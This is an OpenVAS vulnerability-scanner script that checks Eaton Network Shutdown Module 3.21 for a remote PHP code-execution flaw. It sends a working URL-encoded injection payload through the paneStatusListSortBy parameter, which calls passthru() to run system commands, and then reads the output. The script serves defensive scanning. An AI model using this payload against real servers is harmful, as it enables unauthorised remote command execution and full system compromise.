###############################################################################
# OpenVAS Vulnerability Test
# $Id: gb_eaton_network_shutdown_module_54161.nasl 7576 2017-10-26 10:01:33Z cfischer $
#
# Eaton Network Shutdown Module Arbitrary PHP Code Execution Vulnerability
#
# Authors:
# Michael Meyer <michael.meyer@greenbone.net>
#
# Copyright:
# Copyright (c) 2012 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or
# modify it under the terms of the GNU General Public License
# as published by the Free Software Foundation; either version 2
# of the License, or (at your option) any later version.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "Eaton Network Shutdown Module is prone to a remote PHP code-execution
vulnerability.

An attacker can exploit this issue to inject and execute arbitrary
malicious PHP code in the context of the webserver process. This may
facilitate a compromise of the application and the underlying system;
other attacks are also possible.

Network Shutdown Module 3.21 build 01 is vulnerable; other versions
may also be affected.";


SCRIPT_OID  = "1.3.6.1.4.1.25623.1.0.103522";

if (description)
{
 script_oid(SCRIPT_OID);
 script_bugtraq_id(54161);
 script_version ("$Revision: 7576 $");
 script_tag(name:"cvss_base", value:"10.0");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:C/I:C/A:C");

 script_name("Eaton Network Shutdown Module Arbitrary PHP Code Execution Vulnerability");

 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/54161");

 script_tag(name:"last_modification", value:"$Date: 2017-10-26 12:01:33 +0200 (Thu, 26 Oct 2017) $");
 script_tag(name:"creation_date", value:"2012-07-23 11:34:22 +0200 (Mon, 23 Jul 2012)");
 script_category(ACT_ATTACK);
 script_tag(name:"qod_type", value:"remote_vul");
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2012 Greenbone Networks GmbH");
 script_dependencies("gb_get_http_banner.nasl", "os_detection.nasl");
 script_require_ports("Services/www", 4679);
 script_mandatory_keys("Pi3Web/banner");

 script_tag(name : "summary" , value : tag_summary);
 exit(0);
}

include("misc_func.inc");
include("http_func.inc");
include("host_details.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:4679);

banner = get_http_banner(port:port);

if("Pi3Web/" >!< banner || "NSMID=" >!< banner)exit(0);

commands = exploit_commands();

foreach cmd (keys(commands)) {

  url = '/view_list.php?paneStatusListSortBy=0%22%5d)%20%26%20passthru(%22' + commands[cmd]  +  '%22)%3b%23';

  if(http_vuln_check(port:port, url:url,pattern:cmd)) {
     
    security_message(port:port);
    exit(0);

  }
}

exit(0);
